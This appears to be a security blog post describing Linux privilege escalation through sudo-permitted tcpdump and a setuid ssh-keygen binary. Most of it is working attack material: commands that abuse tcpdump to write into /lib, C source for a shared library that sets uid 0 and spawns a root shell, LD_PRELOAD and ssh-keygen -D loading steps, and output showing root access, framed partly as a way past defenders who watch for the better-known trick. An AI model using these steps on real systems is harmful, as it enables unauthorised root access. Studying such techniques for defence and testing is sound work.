---
title:  "Neat privilege escalation tricks"
categories: [Deep-Dive]
---

<blockquote>
  <p>Improvise, adapt and overcome!</p>
</blockquote>

A very well-known privileeg escalation trick involving `tcpdump` with sudo privileges (_very often found in large IT departments!_) relies on executing a script instead of a postrotate command as so<sup>[1](https://gtfobins.github.io/gtfobins/tcpdump/)</sup>:

```bash
$ COMMAND='id'
$ TF=$(mktemp)
$ echo "$COMMAND" > $TF
$ chmod +x $TF
$ tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
```

This is all nice and good but all defenders are already looking for the `-z` command, and this trick is pretty easy to spot. But there's another privilege escalation technique, which also abuses the `sudo` privileges assigned to `tcpdump`, which works as follows:
* Abuse `tcpdump` privileges to create a writable file, in a privileged location:
```bash
$ sudo tcpdump -i eth0 -w /lib/x86_64-linux-gnu/shell.so -Z $USER
```
* Compile a dynamic library (code below):
```bash
$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
* Overwrite the `shell.so` file created in the previous step, and make it `suid/sgid`:
```bash
$ cp shell.so /lib/x86_64-linux-gnu/
$ chmod 6755 /lib/x86_64-linux-gnu/shell.so
```
*	Profit!
```bash
$ LD_PRELOAD=shell.so sudo tcpdump
# whoami
root
```

Source code for the POC library:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Another interesting situation I recently run into is `ssh-keygen` binary with `sudo` privileges:
```bash
$ ls -al `which ssh-keygen`
-rwsr-xr-x 1 root root 477488 Aug  4 22:02 /usr/bin/ssh-keygen
```
There's an entry on GTFOBins for this<sup>[2](https://gtfobins.github.io/gtfobins/ssh-keygen/)</sup>, which hints at creating a shared library and load it via the `-D` parameter. This is the tricky part however. If we simply compile the library and try to force `ssh-keygen` to load it, we get the following error:
```bash
$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
$ ssh-keygen -D shell.so
shell.so does not contain expected string C_GetFunctionList
provider shell.so is not a PKCS11 library
cannot read public key from pkcs11
```

We can trace the error to the [ssh-pkcs11.c](https://github.com/openssh/libopenssh/blob/ea5ceecdc2037c5e6e807ab3702fbe3f319351d0/ssh/ssh-pkcs11.c#L486) source file:
```c
if (pkcs11_provider_lookup(provider_id) != NULL) {
	error("provider already registered: %s", provider_id);
	goto fail;
}
/* open shared pkcs11-libarary */
if ((handle = dlopen(provider_id, RTLD_NOW)) == NULL) {
	error("dlopen %s failed: %s", provider_id, dlerror());
	goto fail;
}
if ((getfunctionlist = dlsym(handle, "C_GetFunctionList")) == NULL) {
	error("dlsym(C_GetFunctionList) failed: %s", dlerror());
	goto fail;
}
p = xcalloc(1, sizeof(*p));
p->name = xstrdup(provider_id);
p->handle = handle;
/* setup the pkcs11 callbacks */
if ((rv = (*getfunctionlist)(&f)) != CKR_OK) {
	error("C_GetFunctionList failed: %lu", rv);
	goto fail;
}
```
So our library needs to contain a function called `C_GetFunctionList` which accepts a pointer as its only argument and returns an `int`. We change the function definition as follows:
```c
int C_GetFunctionList(int param)
```
Recompile and profit:
```bash
$ gcc -c -o shell.o shell.c -Wall -Werror -fpic -I.
$ gcc -shared -o shell.so shell.o
$ ssh-keygen -D ./shell.so
# id
uid=0(root) gid=0(root) groups=0(root),1000(kali)
```

## References
1. [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
2. [GTFOBins - ssh-keygen](https://gtfobins.github.io/gtfobins/ssh-keygen/)
